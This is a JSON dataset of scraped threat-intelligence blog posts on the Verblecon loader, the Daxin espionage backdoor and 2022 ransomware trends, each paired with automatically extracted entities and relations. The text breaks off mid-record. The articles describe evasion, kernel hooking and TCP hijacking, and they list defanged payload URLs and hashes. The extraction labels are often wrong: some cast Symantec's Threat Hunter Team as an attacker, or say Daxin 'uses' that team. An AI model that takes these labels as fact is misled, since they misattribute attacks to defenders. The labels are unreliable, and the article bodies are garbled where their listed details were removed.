[
  {
    "title": "verblecon sophisticated malware cryptocurrency mining discord",
    "link": "https://www.security.com/threat-intelligence/verblecon-sophisticated-malware-cryptocurrency-mining-discord",
    "content": "An unknown attacker is using a complex and powerful new malware loader in relatively unsophisticated and low-reward attacks, indicating they may not realize the potential capabilities of the malware they are deploying. The malware, Trojan.Verblecon, is being used in attacks that appear to have installing cryptocurrency miners on infected machines as their end goal. There are some indications the attacker may also be interested in stealing access tokens for chat app Discord. However, the capabilities of this malware indicate that it could be highly dangerous if leveraged in ransomware or espionage campaigns. Verblecon was first spotted by analysts from Symantec, a division ofBroadcom Software, in January 2022. This blog will detail the capabilities of the malware. The malware is loaded as a server-side polymorphic JAR file. The fact that the file is polymorphic means that, due to encryption and obfuscation, the code of the malware payload looks different each time it is downloaded. Attackers generally pack malware in this way in an effort to evade detection by security software. The malware samples analyzed by Symantec were fully obfuscated, in the code flow, strings, and symbols. The samples themselves may be based onpublicly available code. Once started, the malware checks its command-line arguments. It requires at least one command-line argument to execute, which could be the infection or campaign ID initially e.g. \"CSIDL_SYSTEM_DRIVE\\program files\\java\\jre1.8.0_301\\bin\\javaw.exe\" -jar \"CSIDL_PROFILE\\appdata\\local\\temp\\rpvbh.jar\" masonkhonsari \"CSIDL_SYSTEM_DRIVE\\program files\\java\\jre1.8.0_301\\bin\\javaw.exe\" -jar \"CSIDL_PROFILE\\appdata\\local\\temp\\rpvbh.jar\" 923ec15ffa4474ca7bf200bfb90e782d Additionally, it also attempts to determine if its own process is being debugged by checking for the following Java command-line arguments: Next, it attempts to detect if it is being opened in a virtual or sandbox environment, which would indicate it is likely being opened on a security researcher’s machine. First, it checks for the following directories: It also obtains the machine MAC address and attempts to check for the following prefixes, which may indicate the file is being opened on a virtual machine: Following those checks, it executes the following command to obtain a list of running processes: It then appears to check these processes against a set list: It then also checks for the following files: Next, it appears to check the user name against the following: Then it executes the following command: It is unclear how the output is processed, however, there are some strings that could be related to this or other registry checks: If satisfied with these checks, it may copy itself as one of the following files: And then create one of the following files to use as a loadpoint: [INFECTION_ID] is computed as follows: Then it periodically attempts to connect to the following URLs: [DGA_NAME] is apparently generated using the following method: The traffic generated by the malware looks like this: The server response appears as the below. Some of the strings in this response indicate that the attacker may be leveraging legitimate Cloudflare infrastructure to host some of their C&C infrastructure. The server response body above is an encrypted blob that contains a URL signed with an RSA key. This blob can be decrypted and validated as follows: The malware then starts communicating with the decoded URL by sending details about the infected computer: The request body contains the following information about the infected machine in encrypted form: The server has been observed to respond as follows: Where the response body can be decrypted as follows: The last term above contains the following string: Some samples of the malware are seen communicating with the following servers: Communication between the malware and servers is over HTTP or HTTPS and this communication appears to culminate with victims being directed to connect to the following: The payload is downloaded from the URL observed earlier: The payload is obfuscated in a similar way to the other samples, and also contains similar techniques to detect the virtualization environment, as well as other functionality. The core functionality is to download and execute a binary blob from the following URL: The blob is decrypted along with *.bin artifacts from the same host. The downloaded blob is then cached on the local filesystem (in re-encrypted form) and injected into %Windows%\\SysWow64\\dllhost.exe for execution. The injection is performed using com.sun.jna and doesn't use usual APIs for injection. The final payload (hardwick.bin) contains the following embedded URL pointing to a configuration file for a cryptocurrency miner: This indicates that the purpose of this activity was to install cryptocurrency mining software on victim machines. The evidence found on victim networks appears to indicate that the goal of the attacker was to install cryptocurrency mining software on victim machines. This would appear to be a relatively low-reward goal for the attacker given the level of effort that would have been required to develop this sophisticated malware. There are also indications that the attacker may be stealing Discord tokens and using these to advertise Trojanized videogame applications. We suspect they were stealing Discord tokens because some of the obfuscated strings refer to pathnames that are apparently related to Discord clients, specifically: Discord is a group chatting app that is particularly popular among the gaming community. Advertising Trojanized videogame applications via Discord is likely a redistribution channel for Trojan.Verblecon. Most of the infections we saw where this malware was used were on non-enterprise machines; we rarely see ransomware deployed on non-enterprise machines. Previous reportshave connected related domains to a single occurrence of ransomware, but the infrastructure may be shared with an unrelated actor. The similarities between that incident and the activity we observed includes: However, we do not have enough evidence to draw a definitive link between both these sets of activity. The activity we have seen carried out using this sophisticated loader indicates that it is being wielded by an individual who may not realize the capabilities of the malware they are using. However, if it fell into the hands of a more sophisticated actor the potential is there for this loader to be used for more serious attacks, including potentially ransomware and espionage campaigns. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 32a9415daa7f37a93dd0b347461844673c0f5baf0c15c01ee48b147dadf28299 3688c249774cc9a28d2b9b316921cec842bb087c57f4733cf5866226fbe2aeed 5a4f6332ad08b35c055bb5e6dfddc79d2f7905e63fac7595efbedd0b27f12eb8 007f5898c52c3aa1c3dca6d3a30f28f5f72d9789fbb440ae656d88959f68e53e f3f4af5f5eae1a28ad5a01b56d71302a265bce17d2c87ce731edf440612818a6 hxxp://verble[.]software/styles.jar hxxps://jonathanhardwick[.]me/hardwick.jar hxxps://jonathanhardwick[.]me/hardwick.bin hxxps://jonathanhardwick[.]me/config.txt hxxp://test.verble[.]rocks/dorflersaladreviews.jar hxxp://test.verble[.]rocks/dorflersaladreviews.bin The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Trojan.Verblecon, Malware), (Symantec, Tool), (Broadcom Software, Tool), (Discord, Tool), (January 2022, Date)\nRelationships: (Trojan.Verblecon, uses, JAR file), (Trojan.Verblecon, loadsAs, server-side), (Trojan.Verblecon, isPolymorphic), (Trojan.Verblecon, isObfuscated), (Trojan.Verblecon, requiresArgument), (Trojan.Verblecon, checksArguments)",
      "entities": [
        [
          "Trojan.Verblecon",
          "Malware"
        ],
        [
          "Symantec",
          "Tool"
        ],
        [
          "Broadcom Software",
          "Tool"
        ],
        [
          "Discord",
          "Tool"
        ],
        [
          "January 2022",
          "Date"
        ]
      ],
      "relationships": [
        [
          "Trojan.Verblecon",
          "uses",
          "JAR file"
        ],
        [
          "Trojan.Verblecon",
          "loadsAs",
          "server-side"
        ],
        [
          "Trojan.Verblecon",
          "isPolymorphic"
        ],
        [
          "Trojan.Verblecon",
          "isObfuscated"
        ],
        [
          "Trojan.Verblecon",
          "requiresArgument"
        ],
        [
          "Trojan.Verblecon",
          "checksArguments"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 5,
    "relationship_count": 6
  },
  {
    "title": "daxin backdoor espionage analysis",
    "link": "https://www.security.com/threat-intelligence/daxin-backdoor-espionage-analysis",
    "content": "This is the concluding part of our in-depth analysis of Backdoor. Daxin, advanced malware that is being used by a China-linked espionage group. In this blog, we will analyze the communications and network features of the malware. In ourprevious blog, we set up a lab consisting of four separate networks and five machines. Some of the machines had two network interfaces to communicate with different networks, but all packet forwarding functionality was disabled. Each machine ran various network services that were reachable from its neighbors only. In this section we will dissect the network traffic between two backdoor instances running on the separate computers “Alice-PC” and “Bob-PC”. The traffic was initiated by the Daxin backdoor running on “Alice-PC” when it was instructed to create a communication channel to “Dave-PC” passing via two intermediate nodes, “Bob-PC” and “Charlie-PC”, as described previously. Using Wireshark, we captured traffic between two backdoor instances, one running on “Alice-PC” and the other on “Bob-PC”, as shown in Figure 2. Starting with the key exchange, all backdoor communication is carried out by exchanging messages that follow the same underlying format: Themagicvalue is always 0x9910 or 0x9911. Thekindvalue identifies the state transition during key exchange. Then, once the encrypted communication channel is established, it encodes the purpose of each message and determines the formatting of the data that follows the fixed-size header. The initial message of the key exchange in the Wireshark capture is not encrypted: It can be decoded as follows: The fieldsmagicandkindcorrespond to the first three bytes of TCP data, 0x10 0x99 0x11. On the target computer, in case it is infected with a copy of the malicious driver, this sequence causes the TCP connection to be hijacked, as explained inpart one of this blog series. The target checks that the received message is valid according to the session state machine, ensuring thatmagicis the expected constant 0x9910 andkindmatches any of two supported values: 0x10 or 0x11. Next, it generates a nonce to use when encrypting any future incoming messages. Finally, it sends a response message with the nonce, its own details, and the information about the infected machine. Parts of the response message are encrypted using a combination of the following algorithms: The details of this response message are as follows: The message includes the backdoor login that is recognized during the following key exchange step, and what looks like malware build and version numbers. Looking at the decoded message, we find references to “XRT” and these reassemble the hardcoded Name “NDISXRPT” that we documented when discussing theNdisRegisterProtocol()call during driver initialization: The initiator responds with the backdoor login and hashed password: It also includes its own nonce, like this: At this point, the peers exchange their nonces and compute two transport keys. Each transport key is used in stream mode to encrypt the TCP half-stream directed towards the side that generated the corresponding nonce. The peers also combined their nonces into the shared key. This shared key will be used to encrypt the body of each exchanged message, reusing the same key every time. The final key exchange message confirms that the initiator was successfully authenticated and the backdoor is ready to process instructions: It can be decoded as follows: For the messages that follow, thekindfield encodes the message purpose. This determines the formatting of the message body. For example, the backdoor instruction to set up new connectivity across multiple malicious nodes useskindvalue 6 with the following message body structure: We could continue to decrypt all the backdoor communication that follows: For example, the next message in the captured network traffic is: This instructs the backdoor to set up remaining connectivity across malicious nodes as explained in the “Backdoor capabilities” section in our previous blog: The most interesting observation about encryption is that Daxin supports two methods for computing the shared key during the key exchange. To select which of the two methods to use, the initiator examines the target message, comparing what looks like build and version numbers against certain hardcoded constants. This could be in order to facilitate upgrading the malicious network in the field without disruption. Additionally, the current key exchange implementation involves additional obfuscation that is not present in some older samples. It is possible that the attacker was forced to change the algorithm and decided to implement additional measures to protect the details of new logic. An alternative explanation is that different teams within the attacker organization were sharing the same codebase, where one of these teams implemented the alternative key exchange method and related obfuscations to mitigate against potential compromise due to the other team’s activity, while still sharing some of the communication infrastructure. The communications protocol documented in the previous section is how two backdoor instances communicate with each other. On top of that, the analyzed sample also supports two additional communication methods. These additional methods are well suited for crossing the perimeter of the target organization. One of these additional communication methods uses HTTP messages to encapsulate backdoor communications. To demonstrate this, we implemented our own client to interact with the backdoor using this method. Our client communicated with the backdoor instance running on “Alice-PC” over HTTP to control a set of infected machines, as discussed in the previous two sections. On the target computer, in case it is infected with a copy of Daxin, the first HTTP request causes the TCP connection to be hijacked due to the malicious packet filter triggering on the HTTP “POST” method string with URI substring “756981520337” as explained in the “Networking” section of our previous blog. Daxin then parses HTTP request headers and extracts the request body. The request body is then interpreted using the same logic as already described in the “Communications protocol” section. The reverse communication is then encapsulated as the HTTP response body. When generating the HTTP response, the malicious driver includes “SID” cookie. The value of “SID” cookie is then used when constructing the URI for the subsequent HTTP request. The malicious driver can also be configured to communicate with a remote TCP server for command and control. It then periodically connects to the remote server, performs a handshake that is unique to this connectivity method, and then starts backdoor communication. This connectivity method is controlled with persistent configuration that can be updated by the remote attacker, as explained in the “Backdoor capabilities” section of our previous blog. To obtain the details of the TCP server to connect to, Daxin checks the value of the “HOST” configuration item. In case the value starts with “http://”, the TCP server details are retrieved from the remote web server, as described below. Otherwise, the configuration value is interpreted as the TCP server address and port. In order to retrieve the TCP server details from the remote web server, the analyzed sample contacts the provided URL and scans the received HTTP response, including HTTP headers, for magic strings. Whenever it finds “f8xD4C01” followed later by “d7C6x12B”, it attempts to interpret any data immediately following the first marker as a hexadecimal string. The data obtained by decoding the hexadecimal string is then decrypted using the following algorithm: The decrypted data are interpreted as the TCP server address and port to use. Whenever the analyzed sample connects to the TCP server, it sends the following sequence of bytes as its handshake: Thetags_valueparameter is the value of the “TAGS” configuration item. We suspect that the remote server uses thetags_valuefor tracking specific infections. The analyzed sample then expects to receive the following hardcoded sequence of bytes from the remote server: This should be followed by the usual key exchange as described in the “Communication protocol” section, where the remote server acts as initiator. This concludes the second and final part of our technical analysis of Backdoor.Daxin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Backdoor, Malware), (Daxin, Attacker), (Wireshark, Tool), (Figure 2, URL)\nRelationships: (Backdoor, uses, Daxin), (Backdoor, executedBy, Alice-PC), (Backdoor, executedBy, Bob-PC), (Backdoor, communicatedThrough, Charlie-PC), (Backdoor, communicatedThrough, Bob-PC)",
      "entities": [
        [
          "Backdoor",
          "Malware"
        ],
        [
          "Daxin",
          "Attacker"
        ],
        [
          "Wireshark",
          "Tool"
        ],
        [
          "Figure 2",
          "URL"
        ]
      ],
      "relationships": [
        [
          "Backdoor",
          "uses",
          "Daxin"
        ],
        [
          "Backdoor",
          "executedBy",
          "Alice-PC"
        ],
        [
          "Backdoor",
          "executedBy",
          "Bob-PC"
        ],
        [
          "Backdoor",
          "communicatedThrough",
          "Charlie-PC"
        ],
        [
          "Backdoor",
          "communicatedThrough",
          "Bob-PC"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 4,
    "relationship_count": 5
  },
  {
    "title": "ransomware threat landscape what expect 2022",
    "link": "https://www.security.com/threat-intelligence/ransomware-threat-landscape-what-expect-2022",
    "content": "Ransomware continued to be the most significant cyber threat facing enterprises during 2021. While ransomware gangs are currently experiencing a period of turmoil and disruption, there is no guarantee that the threat posed by ransomware will abate in 2022, since similar disruptions in the past were usually followed by the emergence of new threats. According to anew whitepaperpublished by the Symantec Threat Hunter team, part ofBroadcom Software, targeted ransomware attacks continued to trend upwards in 2021, almost trebling between the first and final quarters of the year. One of the main developments during 2021 was the disappearance of established threat actors and the emergence of new groups to take their place. Of the major ransomware threats operating at the beginning of 2021, only Conti continued to remain active at year end. During 2021, a number of high-profile ransomware operations disappeared. These included Leafroller (aka Sodinokibi, REvil), Coreid (Darkside and Blackmatter), and Avaddon. However, a number of new actors have emerged to take their place. LockBit expanded rapidly following the departure of some of its rivals, while several new threats such as Pinion (Hive) and Sirex (AvosLocker) became quite active. One of the key trends noted in this research is the constantly evolving set of tools, tactics, and procedures (TTPS) employed by ransomware attackers. New TTPs emerge regularly as attackers bid to stay one step ahead of network defenders. Ransomware groups these days now employ quite a diverse toolset, making use of a mixture custom malware, legitimate software, and operating system features (also known as living off the land). This diverse toolset is evident in the ten most frequently employed TTPs Symantec’s Threat Hunter Team found in ransomware investigations. The most frequently used tool, PsExec, is a Windows operating system feature that is often abused by attackers for executing processes on other systems. The next most frequently used tool was Cobalt Strike, which is off-the-shelf malware ostensibly sold as a penetration testing tool but is most frequently seen being used for malicious purposes. New TTPs seen during the latter half of 2021 include abuse of VssAdmin, a legitimate Windows process that can be used to manage or delete shadow copies on Windows machines; along with abuse of MSIExec, a legitimate Windows installer that can be used by attackers to load malicious payloads onto targeted machines. This was just a sample of the content in our latest whitepaper.Read the full paperfor more insights into the ransomware threat landscape. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (ransomware, Threat Type), (Conti, Malware), (LockBit, Attacker), (Pinion, Attacker), (Sirex, Attacker)\nRelationships: (ransomware, continues, 2021), (ransomware, evolves, TTPs), (LockBit, expands, after, rivals), (Pinion, becomes, active), (Sirex, becomes, active)",
      "entities": [
        [
          "ransomware",
          "Threat Type"
        ],
        [
          "Conti",
          "Malware"
        ],
        [
          "LockBit",
          "Attacker"
        ],
        [
          "Pinion",
          "Attacker"
        ],
        [
          "Sirex",
          "Attacker"
        ]
      ],
      "relationships": [
        [
          "ransomware",
          "continues",
          "2021"
        ],
        [
          "ransomware",
          "evolves",
          "TTPs"
        ],
        [
          "LockBit",
          "expands",
          "after",
          "rivals"
        ],
        [
          "Pinion",
          "becomes",
          "active"
        ],
        [
          "Sirex",
          "becomes",
          "active"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 5,
    "relationship_count": 5
  },
  {
    "title": "daxin malware espionage analysis",
    "link": "https://www.security.com/threat-intelligence/daxin-malware-espionage-analysis",
    "content": "Following on from ourearlier blogdetailing the discovery of Backdoor.Daxin, Symantec’s Threat Hunter Team, part of Broadcom Software, would like to provide further technical details on this threat. Used by a China-linked espionage group, Daxin exhibits technical sophistication previously unseen by such actors. In particular, it implements communications features that appear to have been designed for deep penetration of highly-secured networks. The focus of this blog series is to document how these features were implemented. Daxin comes in the form of a Windows kernel driver. In this blog, we will detail the driver initialization, networking, key exchange, and backdoor functionality. In our next blog, the second of two, we will examine the communications and network features of the malware. Our analysis is based on a Backdoor.Daxin sample (SHA256: ea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef). The forensic evidence collected by us indicates that this sample had been deployed in November 2021 against two separate organizations. The described Daxin features are contained in many earlier Daxin variants unless stated otherwise. The recent changes to the driver codebase are to support more recent Windows versions and fix certain bugs. The Daxin sample analyzed appears to be packed with a standard VMProtect packer. Many earlier samples feature an additional, outside, packing layer on top of VMProtect. That outside packer was custom-made for the driver and even reused the same customized encryption algorithm used in the final payload. We believe that the attackers decided to remove that custom packer due to compatibility issues with recent Windows releases. Whenever the driver is started, the code added by the packer decrypts and decompresses the final payload, and then passes control to the entry point of the decompressed payload. At this point, the malicious code is visible in kernel memory, albeit with some obfuscations. The bulk of the payload initialization code is involved with the network stack of the Windows kernel. This includes identification of some non-exported structures and hooking of the Windows TCP/IP stack. Daxin hooks the Network Driver Interface Specification (NDIS) layer by modifying every pre-existingNDIS_OPEN_BLOCKfor the TCP/IP protocol, where theReceiveNetBufferListsandProtSendNetBufferListsCompletehandlers are replaced with its own. For each of theseNDIS_OPEN_BLOCKs, the relatedNDIS_M_DRIVER_BLOCKmay also be modified by replacing any existingSendNetBufferListsHandler. When theSendNetBufferListsHandleris not present, the correspondingNDIS_MINIPORT_BLOCKis modified by replacingNextSendNetBufferListsHandler. To identify allNDIS_OPEN_BLOCKsfor the TCP/IP protocol, the driver relies on callingNdisRegisterProtocol()to create and return a new head of non-exportedndisProtocolList. Then it walksndisProtocolListof everyNDIS_PROTOCOL_BLOCKcomparing theNameattribute of each visitedNDIS_PROTOCOL_BLOCKstructure with the string “TCPIP”. TheOpenQueuefield of the matching structure points to the list ofNDIS_OPEN_BLOCKsto hook. This basic technique isknown and documented, but Daxin hooks a slightly different set of handlers. We believe that these adjustments are not exclusive to Daxin and are driven by architectural changes in Windows Network Architecture. In order to identify the relatedNDIS_M_DRIVER_BLOCKsandNDIS_MINIPORT_BLOCKs, the driver analyses “ndis.sys” machine code to locate non-exportedndisFindMiniportOnGlobalList()andndisMiniDriverList. The relevantNDIS_MINIPORT_BLOCKsare then obtained starting with the previously identifiedNDIS_OPEN_BLOCKs, where theRootDeviceNameof each instance is passed as a parameter for thendisFindMiniportOnGlobalList()call that returns the structure to hook. Finally, to locate relatedNDIS_M_DRIVER_BLOCKs, the driver walksndisMiniDriverListchecking theMiniportQueuelist of each item for the already identifiedNDIS_MINIPORT_BLOCKs. Details of the hooking process demonstrated in this blog were captured in the lab using a virtual machine with a kernel debugger attached. When registering the fake protocol, Daxin calls theNdisRegisterProtocol()API passing aProtocolCharacteristicsargument with the hardcodedNameattribute “NDISXRPT”. Because the layout of theNDIS_OPEN_BLOCKstructure changes between different Windows builds, Daxin needs to determine the correct offsets to use. First it checksNtBuildNumberagainst a set of hardcoded values for whichNDIS_OPEN_BLOCKoffsets are explicitly given (Figure 2). The most recent Windows build number hardcoded in Daxin’s codebase is 17763. It corresponds to Windows Server 2019 and Windows 10 version 1809 (Redstone 5). When the Windows build is not recognized, Daxin attempts to use an alternative method to determine the NDIS_OPEN_BLOCK offsets. Daxin then collects details of all NDIS structures to hook, as discussed earlier, along with information about the related network interfaces. Finally, for each network interface, it replaces the original handlers with its own. Both theReceiveNetBufferListshook and theSendNetBufferListsHandler(orNextSendNetBufferListsHandler) hook implement logic to inspect the network packets and then hijack some packets before passing the remaining packets to the original handlers. TheProtSendNetBufferListsCompletehook completes any send operation initiated by Daxin, such thatNET_BUFFER_LISTstructures owned by malware are removed and deallocated before calling the original handler. Before describing the hooks’ implementation in detail, we will first examine a few examples of the observed behavior in Daxin. In the first scenario, theReceiveNetBufferListshook checks the data section of certain TCP packets for predefined patterns. Any matching TCP packets are then removed from theNetBufferListsbefore calling the originalReceiveNetBufferListshandler. At the same time, for each removed TCP packet, the malicious driver sends two new packets. The first packet is a spoofed RST TCP packet sent to the original destination, so that its recipient marks the TCP connection as closed. The second packet is an ACK TCP packet sent to the original source. From that point, the malicious driver maintains the TCP connection with the original source, relying on theReceiveNetBufferListshook to hijack any related network packets. A test demonstrating this scenario is illustrated in Figure 4. When generating its network traffic, Daxin uses its own code to forge network packets, bypassing the legitimate Windows TCP/IP stack. To illustrate this, we reconfigured the Windows TCP/IP stack to use non-standardTime to Live (TTL). Since Daxin does not respect the updated parameter, its traffic stands out in the Wireshark capture shown in Figure 4. The TCP retransmissions in the Wireshark capture are due to our scripts for the kernel debugger that slow down driver response. The retransmissions are not expected otherwise. We decided to activate these scripts to illustrate the internal working of the driver, where we can recognize individual packets from our Wireshark capture, as illustrated in Figure 5. In another scenario, Daxin initiates a new TCP connection and maintains it over the whole lifetime of the TCP session. The malware relies on theReceiveNetBufferListshook to hijack any network packets related to this connection. The hijacked packets do not reach the legitimate Windows TCP/IP driver. An example TCP connection initiated by the malicious driver will be discussed later in this blog series. In the last scenario, Daxin sends a DNS request using the UDP protocol. The response UDP packet is hijacked by theReceiveNetBufferListshook and the DNS response is parsed by the malicious driver. We exercised this functionality in our lab when exploring configuration options related to command-and-control connectivity. The described scenarios indicate that Daxin implements its own TCP/IP stack. This was confirmed with further reverse engineering of the driver, where we identified both data structures and subroutines implementing IPv4, TCP, and UDP. The main purpose of the NDIS hooks installed by Daxin is to allow for its malicious TCP/IP stack to coexist with the legitimate Windows TCP/IP stack on the same machine. When certain conditions are met, the hooks also allow it to hijack pre-existing TCP connections. TheReceiveNetBufferListshook checks theNblFlagsmember of theNET_BUFFER_LISTstructure at the head of itsNetBufferListsargument for theNDIS_NBL_FLAGS_IS_LOOPBACK_PACKETflag. Whenever the flag is set, the hook simply passes the network data to the originalReceiveNetBufferListshandler with no other processing. Otherwise, it calls a helper subroutine passing theNetBufferListslinked list ofNET_BUFFER_LISTs. The helper subroutine divides the original linked list ofNET_BUFFER_LISTsinto two chains: one chain of allowed packets for further processing by the legitimate stack and another chain of hijacked packets to drop. The hook then passes the chain of allowed packets to the originalReceiveNetBufferListshandler. Next, if theNDIS_RECEIVE_FLAGS_RESOURCESflag is not set in itsReceiveFlagsargument, the hook releases ownership of the chain of hijacked packets usingNdisReturnNetBufferLists(). TheSendNetBufferListsHandlerhook checks if theNdisPoolHandlemember of theNET_BUFFER_LISTstructure, passed as itsNetBufferListargument, corresponds to the pool created by Daxin itself to use when sending malicious traffic. If so, the hook simply passes the network data to the originalSendNetBufferListsHandlerwith no other processing. Otherwise, it calls the same helper subroutine as used by theReceiveNetBufferListshook to divide itsNetBufferListargument into two chains. It then passes the chain of allowed packets to the originalSendNetBufferListsHandler. Finally, the chain of hijacked packets is retired using theNdisMSendNetBufferListsComplete()orProtSendNetBufferListsCompletehandler. The helper subroutine used by both hooks walks the original linked list ofNET_BUFFER_LISTsextracting network packets from each visitedNET_BUFFER_LISTstructure and calling the malicious packet filter for each extracted packet. The verdict returned by the packet filter for the first packet from the visitedNET_BUFFER_LISTstructure determines if the structure should be allowed for further processing by the legitimate stack or dropped by the hook. The packet filter is central to the networking capabilities of Daxin as it controls dispatching of the extracted packets to various Daxin's sub-modules, where each sub-module implements different functionality. The filter returns an “accept” or “drop” verdict to indicate if relevant packets should reach the legitimate TCP/IP stack or not. It operates as follows: Finally, theProtSendNetBufferListsCompletehook walks the list ofNET_BUFFER_LISTstructures passed as its second argument checking if theNdisPoolHandlemember of the visitedNET_BUFFER_LISTstructure corresponds to the pool created by the malicious driver itself to use when sending malicious traffic. The matching structures are removed from the list and, after validating the Flags member, deallocated. The hook then passes the modified list to the originalProtSendNetBufferListsCompletehandler. Atechnical paper by Kasperskyon the Slingshot advanced persistent threat (APT) group describes a technique to identifyNET_BUFFER_LISTthat is very similar to how theProtSendNetBufferListsCompletehook works, including the use ofNdisAllocateNetBufferListPool()andNdisAllocateNetBufferAndNetBufferList().However, there are no other significant structural overlaps. Whenever Daxin hijacks a TCP connection, it checks the received data for a specific message. The expected message initiates a custom key exchange, where two peers follow complementary steps. When discussing this key exchange protocol, we are going to use the term “initiator” when referring to the side sending the initial message. The opposite side will be called “target”. Interestingly, the analyzed sample can implement both the initiator side and the target side of this custom key exchange protocol. Firstly, Daxin starts the target-side protocol for each hijacked TCP connection. Additionally, it can be configured to connect to a remote TCP server, where it exchanges a certain handshake and then also starts the target-side protocol. This scenario will be discussed in our next blog in this series in a section titled “External communication.” Finally, Daxin can be instructed to connect to a remote TCP server, where it starts the initiator-side protocol. We will expand on this in the next section. A successful key exchange opens an encrypted communication channel. Daxin uses this communication channel to exchange various messages. Some messages instruct the malware to perform various operations, such as starting an arbitrary process on the affected computer. Others carry results of these operations, such as output generated by the started process, for example. The set of operations recognized by Daxin is rather compact, with the most basic operations being reading and writing arbitrary files. Daxin can also execute arbitrary EXE and DLL binaries. In the case of EXE files, Daxin starts a new user-mode process. The standard input and output of the started process is redirected, so that the remote attacker can interactively send input and receive output. When ordered to execute a DLL file, Daxin performs injection into one of the pre-existing “svchost.exe” processes. Daxin provides a dedicated communication mechanism for any additional components deployed by the attacker on the affected computer. Any compatible component can open a “\\\\.\\Tcp4” device created by Daxin to register itself for communication, where it can optionally assign a 32-bit service identifier to distinguish itself from other services that may be active on the same computer. Daxin then forwards any matching communication between the remote attacker and registered services. Next, the remote attacker can inspect and update the backdoor configuration. The configuration is implemented as a generic key-value structure that is stored in an encrypted form in the Windows Registry for persistence. All used configuration items will be listed in the “External communication” section in a subsequent blog. There are also dedicated messages that encapsulate raw network packets to be transmitted via a local network adapter. Any response packets are then captured by the malicious driver and forwarded to the remote attacker. This allows the remote attacker to establish communications with any servers reachable from the affected machine on the target’s network, creating a network tunnel for the remote attacker to interact with servers of interest. Finally, a special message can be used to set up new connectivity across multiple malicious nodes, where the list of nodes is included in a single command. For each node, the message provides the details required to establish communication, specifically the node IP address, its TCP port number, and the credentials to use during custom key exchange. When Daxin receives this message, it picks the next node from the list. Then it uses its malicious TCP/IP stack to connect to the TCP server listed in the picked entry. Once connected, Daxin starts the initiator-side protocol. On the peer computer, if it is infected with a copy of Daxin, the initiator traffic causes the TCP connection to be hijacked, as explained earlier. This is followed by the custom key exchange to open a new encrypted communication channel. Next, the connecting driver sends an updated copy of the original message over this new channel, where the position of the next node to use is incremented. The process then repeats for the remaining nodes on the list. The TCP connections created during the above process, along with the connection that received the original connectivity setup instruction are then used for subsequent communications. Whenever an intermediate node receives a message, it may execute the requested operation or forward it along the connectivity path. For certain operations, the node to execute the operation is specified by the position along the path. In some remaining cases, the operation is always forwarded to the last node. Finally, certain operations are always executed by the first node only. This method to create multi-hop connectivity is noteworthy. It is not uncommon for the attackers to jump through multiple hops in victim networks to get around firewalls or to better blend in with usual network traffic. This usually involves multiple steps when using other malware, where each jump requires a separate action. However, in the case of the analyzed sample, the attackers combined these into a single operation. This may indicate that Daxin is optimized for attacks against well-protected networks and cases when the attackers need to periodically reconnect into the compromised network. The ability to use hijacked TCP connections for backdoor communications is also significant. This may be required when exploiting tightly controlled networks, with strict firewall rules or when the defenders monitor for network anomalies. On the infected machine, any malicious network connections are bypassing the Windows TCP/IP stack, and this could provide some degree of stealth. The attackers invested significant effort in implementing these features with a malicious TCP/IP stack supporting TCP connection hijacking. The implementation of network tunneling, where the malicious driver passes the packets directly between the remote attacker and the target’s network demonstrates how the attackers attempt to minimize their footprint without sacrificing functionality. In order to demonstrate Daxin’s backdoor capabilities, we prepared a lab setup to both illustrate what was described in the previous section and also to collect some examples of malicious network traffic to discuss later. Our lab setup consisted of four separate networks and five machines. Some of the machines had two network interfaces to communicate with different networks, but all packet forwarding functionality was disabled. Each machine ran various network services that were reachable from its neighbors only. In our setup, the attackers can communicate with “Alice-PC”, while all of the other machines are unreachable directly to the attackers. This simulates the network of a hypothetical victim, where machines serving different roles have very restrictive connectivity. “Alice-PC” could represent a DMZ service that is accessible from the internet, but all the other machines are tightly isolated. We infected all of the configured machines with Daxin, except for just one machine deep in our network that was left clean. Next, based on our understanding of the malicious communications protocol gained during reverse engineering of the malicious driver, we implemented a rough client to interact with the Daxin backdoor running on “Alice-PC”. We used this client to instruct the backdoor on “Alice-PC” to create a communications channel to “Dave-PC” passing via two intermediate nodes: “Bob-PC” and “Charlie-PC”. The connectivity was established successfully, and we were able to interact with all the infected machines. Finally, we were able to use this malicious network tunnel via “Dave-PC” to communicate with legitimate services on “Clean-PC”. This concludes the first part of our technical analysis of Daxin. In our second, and final blog, we will examine the communications and networking features of the malware. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Backdoor.Daxin, Malware), (Symantec's Threat Hunter Team, Attacker), (ea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef, Hash), (November 2021, Date), (two separate organizations, Target)\nRelationships: (Backdoor.Daxin, uses, Symantec's Threat Hunter Team), (Backdoor.Daxin, contains, ea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef), (Backdoor.Daxin, targets, two separate organizations)",
      "entities": [
        [
          "Backdoor.Daxin",
          "Malware"
        ],
        [
          "Symantec's Threat Hunter Team",
          "Attacker"
        ],
        [
          "ea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef",
          "Hash"
        ],
        [
          "November 2021",
          "Date"
        ],
        [
          "two separate organizations",
          "Target"
        ]
      ],
      "relationships": [
        [
          "Backdoor.Daxin",
          "uses",
          "Symantec's Threat Hunter Team"
